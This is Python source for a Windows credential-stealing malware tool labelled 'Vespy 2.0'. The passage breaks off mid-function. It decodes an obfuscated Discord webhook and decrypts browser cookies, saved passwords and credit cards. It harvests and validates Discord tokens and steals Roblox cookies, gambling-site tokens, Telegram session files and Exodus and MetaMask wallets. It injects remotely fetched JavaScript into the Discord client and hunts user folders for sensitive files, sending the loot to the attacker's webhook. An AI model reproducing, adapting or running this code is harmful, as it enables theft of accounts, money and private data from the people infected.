import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes, uuid, pygame
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
from pygame import camera
from pathlib import Path

wbh = str(requests.get(__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(122)}{chr(108)}{chr(105)}{chr(98)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode("c$_Vb*$o6S2t!)}b7h)<N$9_qA*(flk7wERmWZ@vNmqJ&d#O5s2u#fW;}nWMmO?xnzCvdxL=ue-@#P$F3!NPox5&o9@IcRfCb2|jZx&&<w|7kASzMIwOErk4AkHY0I^5+gvG3o%)E>(ZufQnP".encode())).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()).text)
if wbh.startswith(f"{chr(51)}"):
    while True:
        try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.strip().split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
        except:break
dtokens = []
rocookies = []
ropasswords = []
dispasswords = []

try:
    os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
except:
    try:
        shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
    except:
        pass
        
class CookieInfo():
    # adding more soon
    def __init__(self, RoCookies):
        for i in RoCookies:
            self.RobloxInfo(i)

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            PASSWORD = "Not Found"
            for i in ropasswords:
                if str(r['UserName']).lower() == i.split("|")[0].strip().lower():
                    PASSWORD = i.split("|")[1].strip()
            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:lock: Roblox Password: ``{PASSWORD}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
            embed.set_thumbnail(url=r['ThumbnailUrl'])
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.amountcookies = 0
        self.amountpasswords = 0
        self.amounthistory = 0
        self.amountdownloads = 0
        self.amountccs = 0
        self.amountautofill = 0
        self.Passwords = "-"
        self.History = "-"
        self.Downloads = "-"
        self.CCs = "-"
        self.Autofill = "-"
        os.mkdir(os.path.join(P4THF0LDR, "Browsers"))
        self.BROWSERPATHFOLDER = os.path.join(P4THF0LDR, "Browsers")
        os.mkdir(os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies"))
        self.COOKIESPATHFOLDER = os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies")
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.prof = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for i in paths:
            if os.path.exists(i):
                try:
                    key = self._key(os.path.join(i, "Local State"))
                    self.cookies(i, key)
                    self.passwords(i, key)
                    self.history(i)
                    self.downloads(i)
                    self.ccs(i, key)
                    self.autofill(i)
                except:
                    pass
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        T=0
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Network", "Cookies")
                    if "Opera Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\Opera_Cookies.json"
                        f = open(writefilepath,"w+")
                    if "Opera GX Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\OperaGX_Cookies.json"
                        f = open(writefilepath,"w+")
                    T+=1
                else:
                    if "Chrome" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Chrome_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Edge" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Edge_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Brave-Browser" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Brave_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    new_path = os.path.join(p, i, "Network", "Cookies")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        cookies = []
                        for row in cursor.execute("SELECT * FROM cookies").fetchall():
                            dec_value = self._decrypt(row[5],key)
                            if str(row[3]) == ".ROBLOSECURITY":
                                if dec_value not in rocookies:
                                    rocookies.append(dec_value)
                            if str(row[14]) == "-1":R="unspecified"
                            elif str(row[14]) == "1":R="lax"
                            else:R="no_restriction"
                            cookie = {}
                            cookie["domain"] = row[1]
                            if row[7] != 0:
                                cookie["expirationDate"] = (row[7] - 11644473600000000) / 1000000
                            cookie["hostOnly"] = not "." in row[1]
                            cookie["httpOnly"] = bool(row[9])
                            cookie["name"] = row[3]
                            cookie["path"] = row[6]
                            cookie["sameSite"] = R
                            cookie["secure"] = bool(row[8])
                            cookie["session"] = row[11] == 0
                            cookie["storeId"] = "0"
                            cookie["value"] = dec_value
                            cookies.append(cookie)
                            self.amountcookies += 1
                        cursor.close()
                        con.close()
                        json.dump(cookies, f)
            except:pass
    def passwords(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Passwords.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Login Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Login Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Login Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                            url, name, password = V
                            dec = self._decrypt(password,key)
                            if 'roblox' in url:
                                ropasswords.append(f"{name}|{dec}")
                            if 'discord' in url:
                                dispasswords.append(f"{name}|{dec}")
                            self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                            self.amountpasswords += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\History.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                            url, title, count, last_visit = V
                            if url and title and count and last_visit != "":
                                if len(self.History) < 100000:
                                    self.History += "="*50+f"\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n"
                                    self.amounthistory += 1
                            else:break
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Downloads.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "History2"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History2")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                            url, path = V
                            self.Downloads += "="*50+f"\nURL : {url}\nPath : {path}\n"
                            self.amountdownloads += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Autofill.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name, value FROM autofill").fetchall():
                            name, value = V
                            self.Autofill += "="*50+f"\nName : {name}\nValue : {value}\n"
                            self.amountautofill += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\CreditCards.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                            name, exp_month, exp_year, cne = V
                            cn = self._decrypt(cne,key)
                            self.CCs += "="*50+f"\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n"
                            self.amountccs += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Browsers``
``|   |_``:open_file_folder: ``Importable_Cookies``
``|   |   |_``:page_facing_up: ``({self.amountcookies}) Cookies``
``|   |_``:page_facing_up: ``({self.amountpasswords}) Passwords``
``|   |_``:page_facing_up: ``({self.amounthistory}) History``
``|   |_``:page_facing_up: ``({self.amountdownloads}) Downloads``
``|   |_``:page_facing_up: ``({self.amountccs}) CreditCards``
``|   |_``:page_facing_up: ``({self.amountautofill}) Autofills``"""
class DISCORD:

    def __init__(self):
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        for i in paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        self.send()
    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        dtokens.append(token)
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(base64.b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            dtokens.append(token)
                                            self.tokens.append(token)
                                except:pass
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
    def send(self):
        if len(self.tokens) > 0:
            for tok in self.tokens:
                try:
                    info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    user = info['username']+"#"+info['discriminator']
                    id = info['id']
                    email = info["email"]
                    if info["verified"]:
                        verf = ":white_check_mark:"
                    else:verf = ":x:"
                    phone = info["phone"]
                    avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
                    if info['mfa_enabled']:
                        af2 = ":white_check_mark:"
                    else:af2 = ":x:"
                    if info['premium_type']==0:
                        N=":x:"
                    elif info['premium_type']==1:
                        N="``Nitro Classic``"
                    elif info['premium_type']==2:
                        N="``Nitro Boost``"
                    elif info['premium_type']==3:
                        N="``Nitro Basic``"
                    else:N=":x:"
                    P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    if P == []:
                        bil = ":x:"
                    else:
                        for b in P:
                            if b['type']==1:
                                bil=":credit_card:"
                            elif b['type']==2:
                                bil=":regional_indicator_p:"
                    PASSYWORDY = "Not Found"
                    for i in dispasswords:
                        if str(info['username']).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                        elif str(email).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n\n:email: Email: ``{email}``\n:lock: Password: ``{PASSYWORDY}``\n\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``")
                    embed.set_thumbnail(url=avatar)
                    webhook.add_embed(embed)
                    webhook.execute()
                except:pass
class Telegram:

    def __init__(self):
        self.files = 0
        try:
            os.mkdir(os.path.join(P4THF0LDR, "Telegram"))
            self.telegramfolder = os.path.join(P4THF0LDR, "Telegram")
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData","Roaming","Telegram Desktop","tdata")
            self.getTele(self.path)
        except:
            pass
    
    def getTele(self,path):
        files = os.listdir(path)
        for i in files:
            self.files +=1
            shutil.copy(path+"\\"+i,self.telegramfolder+"\\"+i)
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Telegram``
``|   |_``:page_facing_up: ``({self.files}) Telegram Files``"""
class EXodus:

    def __init__(self):
        self.amountfiles = 0
        self.county = 0
        self.pathyy = os.path.join(P4THF0LDR, "Wallets")
        os.mkdir(self.pathyy)
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(self.path+"\\exodus.wallet")
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.stealmeta(paths, profs)
        except:
            pass
    
    def stealexo(self, path):
        exopath = os.path.join(self.pathyy, "Exodus")
        os.mkdir(exopath)
        P=os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(path+f"\\{i}",exopath+f"\\{i}")
    
    def stealmeta(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Metamask")
        os.mkdir(metapath)
        for i in paths:
            if "Opera Software" in i:
                try:
                    Path = os.path.join(i,"Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn")
                    shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                    self.amountfiles += 1;self.county += 1
                except:
                    pass
            else:
                for I in profs:
                    try:
                        if "3dge" in i:
                            i = i.replace("3dge","Edge")
                            lastpart = "ejbalbakoplchlghecdalmeeeajnimhm"
                        else:
                            lastpart = "nkbihfbeogaeaoehlefnkodbefgpgknn"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.amountfiles += 1;self.county += 1
                    except:
                        pass

    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Exodus & Metamask``
``|   |_``:page_facing_up: ``({self.amountfiles}) Exodus & Metamask Files``"""
class Roblox:

    def __init__(self):
        os.mkdir(os.path.join(P4THF0LDR, "Roblox"))
        self.robloxfolder = os.path.join(P4THF0LDR, "Roblox")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self.__repr__()

    def Rblxwild(self,p):
        filo=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Rbxflip(self,p):
        filo=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Bloxflip(self,p):
        filo=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass
        filo.close()

    def RobloxStudio(self):
        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.robloxcookies += 1
                    filo.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        filo.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Roblox``
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``
``|   |_``:page_facing_up: ``({self.robloxcookies}) Roblox_Cookies``
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""
class Injection:
    def __init__(self):
        self.LOCAL_APP_DATA = Path(os.getenv('localappdata'))
        self.inject()

    def inject(self):
        for _dir in os.listdir(self.LOCAL_APP_DATA):
            if 'discord' in _dir.lower():
                for __dir in os.listdir(self.LOCAL_APP_DATA / _dir):
                    if re.match(r'app-(\d*\.\d*)*', __dir):
                        abspath = self.LOCAL_APP_DATA / _dir / __dir
                        f = requests.get("https://raw.githubusercontent.com/vesperlol/Vespy-Grabber-v2.0/main/injection/injection.js").text.replace("%WEBHOOK%", wbh)
                        try:
                            index_file_path = abspath / 'modules' / 'discord_desktop_core-1' / 'discord_desktop_core' / 'index.js'
                            with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                        except:
                            try:
                                index_file_path = abspath / 'modules' / 'discord_desktop_core-2' / 'discord_desktop_core' / 'index.js'
                                with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                    index_file.write(f)
                            except:
                                try:
                                    index_file_path = abspath / 'modules' / 'discord_desktop_core-3' / 'discord_desktop_core' / 'index.js'
                                    with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                        index_file.write(f)
                                except:
                                    pass

class Files:

    def __init__(self):
        self.ZIP = os.mkdir(f"C:\\Users\\{user}\\AppData\\Files")
        self.PTHAY = f"C:\\Users\\{user}\\AppData\\Files"
        self.folders = []
        self.files = 0
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm"]
        self.goal = ["token","webhook","password","passcode","crypto","wallet","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nude","address","backup_codes"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    if fext not in tuple(self.filter):
                                        self.files +=1
